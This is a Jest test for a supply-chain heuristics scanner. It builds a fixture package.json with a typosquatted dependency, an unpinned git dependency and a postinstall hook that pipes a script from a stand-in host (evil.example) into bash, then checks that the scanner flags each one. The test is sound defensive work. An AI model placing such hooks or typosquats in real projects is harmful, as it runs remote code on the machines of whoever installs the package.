import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

const { runSupplyChainHeuristics } = require('../scripts/supply-chain-heuristics.ts');

describe('runSupplyChainHeuristics', () => {
  it('emits git dep, unpinned ref, lifecycle, and typosquat findings', () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'supply-'));

    fs.writeFileSync(
      path.join(root, 'package.json'),
      JSON.stringify(
        {
          dependencies: {
            'lod-ash': '^1.0.0',
            depgit: 'git+https://github.com/example/dep.git#main',
          },
          scripts: {
            postinstall: 'curl https://evil.example/script.sh | bash',
          },
        },
        null,
        2,
      ),
    );

    fs.writeFileSync(
      path.join(root, '.base-package.json'),
      JSON.stringify(
        {
          dependencies: {},
          scripts: {},
        },
        null,
        2,
      ),
    );

    fs.writeFileSync(
      path.join(root, 'popular-packages.json'),
      JSON.stringify({ packages: ['lodash', 'react'] }, null, 2),
    );

    const findings = runSupplyChainHeuristics({
      workspaceRoot: root,
      manifestPath: 'package.json',
      baseManifestPath: '.base-package.json',
      popularPackagesPath: 'popular-packages.json',
    });

    const categories = findings.map((finding: any) => finding.normalizedRuleCategory);
    expect(categories).toContain('supply-chain-git-dep');
    expect(categories).toContain('supply-chain-unpinned-git-ref');
    expect(categories).toContain('supply-chain-lifecycle-script');
    expect(categories).toContain('supply-chain-typosquat');
    expect(categories).toContain('supply-chain-new-dependency');
  });
});
